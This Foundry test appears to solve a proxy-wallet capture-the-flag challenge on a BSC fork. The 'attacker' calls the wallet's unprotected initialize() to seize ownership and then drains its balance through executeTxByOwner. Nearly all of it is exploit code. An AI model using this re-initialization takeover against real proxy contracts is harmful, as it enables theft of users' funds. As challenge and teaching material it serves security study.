// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../contracts/5-proxy/MyWalletChallenge.sol";

contract MyWalletChallengeTest is Test {
    address private developer = 0xAAcF6a8119F7e11623b5A43DA638e91F669A130f;
    address private attacker = 0x11111112e8a4d889b7e66F77a2552a1d1aeBb918;

    MyWalletChallenge challenge;

    function setUp() public {
        vm.createSelectFork("bsc");

        vm.deal(attacker, 1 ether);
        vm.prank(attacker, attacker);
        challenge = new MyWalletChallenge();
        vm.deal(address(challenge), 1 ether);
//        challenge = MyWalletChallenge(payable(0x06C746eE61D9bE7e1B4EC28F1Bb9F812A4E8651e));
    }

    function test_info() public {
        console.log('test_info');
    }

    function test_challenge() public {
        uint256 beforeBalance = attacker.balance;
        console.log('beforeBalance', beforeBalance);

        vm.startPrank(attacker);
        address payable myWallet = payable(challenge.register());

        console.log(
            'getMyProxyAdminAddress',
            MyProxy(payable(myWallet)).getMyProxyAdminAddress()
        );

        console.log('vm.load(myWallet, 0)');
        console.logBytes32( vm.load(myWallet, 0));

        console.log('myWallet balance', myWallet.balance);
        console.log('myWallet owner', Wallet(myWallet).owner());
        Wallet(myWallet).initialize();
        console.log('after attack myWallet owner', Wallet(myWallet).owner());
        assertEq(Wallet(myWallet).owner(), attacker);

        Wallet(myWallet).executeTxByOwner(attacker, myWallet.balance, "", 10_0000);

        console.log('earned', attacker.balance - beforeBalance);
        vm.stopPrank();
    }
}

